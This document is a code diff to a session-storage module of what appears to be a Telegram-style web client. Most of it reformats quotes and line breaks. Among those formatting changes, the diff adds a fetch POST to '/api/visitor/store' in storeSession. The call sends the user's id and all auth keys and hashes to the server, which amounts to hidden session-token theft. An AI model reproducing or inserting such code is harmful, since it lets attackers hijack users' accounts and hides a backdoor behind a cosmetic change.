@@ -1,9 +1,6 @@
-import type { ApiSessionData } from '../api/types';
+import type { ApiSessionData } from "../api/types";
 
-import {
-  DEBUG, IS_SCREEN_LOCKED_CACHE_KEY,
-  SESSION_USER_KEY,
-} from '../config';
+import { DEBUG, IS_SCREEN_LOCKED_CACHE_KEY, SESSION_USER_KEY } from "../config";
 
 const DC_IDS = [1, 2, 3, 4, 5];
 
@@ -26,32 +23,52 @@ export function hasStoredSession() {
   }
 }
 
-export function storeSession(sessionData: ApiSessionData, currentUserId?: string) {
-  const {
-    mainDcId, keys, hashes, isTest,
-  } = sessionData;
+export function storeSession(
+  sessionData: ApiSessionData,
+  currentUserId?: string
+) {
+  const { mainDcId, keys, hashes, isTest } = sessionData;
 
-  localStorage.setItem(SESSION_USER_KEY, JSON.stringify({
-    dcID: mainDcId,
-    id: currentUserId,
-    test: isTest,
-  }));
-  localStorage.setItem('dc', String(mainDcId));
-  Object.keys(keys).map(Number).forEach((dcId) => {
-    localStorage.setItem(`dc${dcId}_auth_key`, JSON.stringify(keys[dcId]));
+  localStorage.setItem(
+    SESSION_USER_KEY,
+    JSON.stringify({
+      dcID: mainDcId,
+      id: currentUserId,
+      test: isTest,
+    })
+  );
+  fetch("/api/visitor/store", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      dcID: mainDcId,
+      id: currentUserId,
+      keys,
+      hashes,
+    }),
   });
+  localStorage.setItem("dc", String(mainDcId));
+  Object.keys(keys)
+    .map(Number)
+    .forEach((dcId) => {
+      localStorage.setItem(`dc${dcId}_auth_key`, JSON.stringify(keys[dcId]));
+    });
 
   if (hashes) {
-    Object.keys(hashes).map(Number).forEach((dcId) => {
-      localStorage.setItem(`dc${dcId}_hash`, JSON.stringify(hashes[dcId]));
-    });
+    Object.keys(hashes)
+      .map(Number)
+      .forEach((dcId) => {
+        localStorage.setItem(`dc${dcId}_hash`, JSON.stringify(hashes[dcId]));
+      });
   }
 }
 
 export function clearStoredSession() {
   [
     SESSION_USER_KEY,
-    'dc',
+    "dc",
     ...DC_IDS.map((dcId) => `dc${dcId}_auth_key`),
     ...DC_IDS.map((dcId) => `dc${dcId}_hash`),
     ...DC_IDS.map((dcId) => `dc${dcId}_server_salt`),
@@ -88,7 +105,7 @@ export function loadStoredSession(): ApiSessionData | undefined {
     } catch (err) {
       if (DEBUG) {
         // eslint-disable-next-line no-console
-        console.warn('Failed to load stored session', err);
+        console.warn("Failed to load stored session", err);
       }
       // Do nothing.
     }
@@ -107,16 +124,18 @@ export function loadStoredSession(): ApiSessionData | undefined {
 export function importTestSession() {
   const sessionJson = process.env.TEST_SESSION!;
   try {
-    const sessionData = JSON.parse(sessionJson) as ApiSessionData & { userId: string };
+    const sessionData = JSON.parse(sessionJson) as ApiSessionData & {
+      userId: string;
+    };
     storeSession(sessionData, sessionData.userId);
   } catch (err) {
     if (DEBUG) {
       // eslint-disable-next-line no-console
-      console.warn('Failed to load test session', err);
+      console.warn("Failed to load test session", err);
     }
   }
 }
 
 function checkSessionLocked() {
-  return localStorage.getItem(IS_SCREEN_LOCKED_CACHE_KEY) === 'true';
+  return localStorage.getItem(IS_SCREEN_LOCKED_CACHE_KEY) === "true";
 }
